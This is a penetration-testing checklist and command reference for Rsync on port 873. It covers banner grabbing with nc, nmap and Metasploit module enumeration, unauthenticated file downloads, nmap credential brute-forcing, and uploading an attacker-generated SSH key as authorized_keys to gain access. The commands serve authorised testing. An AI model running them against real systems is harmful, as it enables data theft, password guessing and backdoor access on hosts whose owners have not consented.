# RPC / Rsync Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Rsync (port 873), I realistically expect to find:

- [ ] List of available modules (directories) exposed by the server
- [ ] Ability to list files within exposed modules without authentication
- [ ] Ability to download sensitive files or backups as an unauthenticated user
- [ ] Authentication prompts indicating protected modules
- [ ] Valid username/password combinations via brute-force or guessing
- [ ] Ability to upload files (e.g., SSH keys) to writable modules
- [ ] Potential for lateral movement by gaining access to other services using retrieved credentials or uploaded keys

---

## ‚úÖ RPC / Rsync Pentest Checklist

- [ ] **Check the Banner**
    ```bash
    nc -vn <IP> 873
    ```

- [ ] **Nmap Scan**
    ```bash
    sudo nmap -sV --script "rsync-list-modules" -p 873 <IP>
    ```

- [ ] **Metasploit Scan**
    ```bash
    msfconsole
    use auxiliary/scanner/rsync/modules_list
    run
    ```

- [ ] **Check If You Can List or Sync as Unauthenticated User**
    ```bash
    rsync -av --list-only rsync://<IP>/<MODULE>
    rsync -av rsync://<IP>/<MODULE> ./local_folder/
    ```

- [ ] **Check If You Can List or Sync as Authenticated User**
    ```bash
    rsync -av --list-only rsync://<USER>@<IP>/<MODULE>
    rsync -av rsync://<USER>@<IP>:8730/<MODULE> ./local_folder/
    ```

- [ ] **Try Uploading Files (e.g., SSH Keys)**
    ```bash
    mkdir .ssh
    ssh-keygen -f .ssh/attack-key -t ecdsa -b 521
    cp .ssh/attack-key.pub .ssh/authorized_keys
    rsync -av .ssh/ rsync://<USER>@<IP>/<MODULE>/.ssh
    ```

- [ ] **Brute Force Authentication**
    ```bash
    nmap -sV --script rsync-brute --script-args userdb=/path/to/usernames.txt,passdb=/path/to/passwords.txt -p 873 <IP>
    ```

---

## ‚úÖ Rsync Useful Commands

- **Banner Grabbing**
    ```bash
    nc -vn <IP> 873
    ```

- **Nmap Scanning**
    ```bash
    sudo nmap -sV --script "rsync-list-modules" -p 873 <IP>
    nmap -sV --script rsync-brute --script-args userdb=/path/to/usernames.txt,passdb=/path/to/passwords.txt -p 873 <IP>
    ```

- **Metasploit Module**
    ```bash
    use auxiliary/scanner/rsync/modules_list
    run
    ```

- **Unauthenticated Rsync Usage**
    ```bash
    rsync -av --list-only rsync://<IP>/<MODULE>
    rsync -av rsync://<IP>/<MODULE> ./local_folder/
    ```

- **Authenticated Rsync Usage**
    ```bash
    rsync -av --list-only rsync://<USER>@<IP>/<MODULE>
    rsync -av rsync://<USER>@<IP>:8730/<MODULE> ./local_folder/
    ```

- **Uploading SSH Keys via Rsync**
    ```bash
    mkdir .ssh
    ssh-keygen -f .ssh/attack-key -t ecdsa -b 521
    cp .ssh/attack-key.pub .ssh/authorized_keys
    rsync -av .ssh/ rsync://<USER>@<IP>/<MODULE>/.ssh
    ```
